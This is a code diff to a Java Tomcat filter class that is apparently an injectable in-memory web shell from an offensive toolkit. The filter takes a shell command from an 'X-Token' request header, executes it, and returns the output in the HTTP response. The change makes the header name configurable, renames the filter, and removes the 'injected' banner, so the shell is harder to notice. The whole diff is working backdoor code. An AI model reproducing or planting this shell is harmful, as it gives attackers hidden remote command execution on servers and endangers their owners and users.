@@ -17,8 +17,9 @@ import java.util.Set;
  */
 public class TomcatFilterJMXMS implements Filter {
 
-    final private static String NAME = "Whoopsunix";
-    final private static String pattern = "/WhoopsunixShell";
+    private static String NAME = "TomcatServletThreadMS";
+    private static String pattern = "/WhoopsunixShell";
+    private static String header = "X-Token";
 
     public TomcatFilterJMXMS() {
 
@@ -116,13 +117,12 @@ public class TomcatFilterJMXMS implements Filter {
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) {
         try {
             HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
-            String header = httpServletRequest.getHeader("X-Token");
-            if (header == null) {
+            String cmd = httpServletRequest.getHeader(header);
+            if (cmd == null) {
                 return;
             }
-            String result = exec(header);
+            String result = exec(cmd);
             PrintWriter printWriter = servletResponse.getWriter();
-            printWriter.println("TomcatFilterJMXMS injected");
             printWriter.println(result);
         } catch (Exception e) {
 
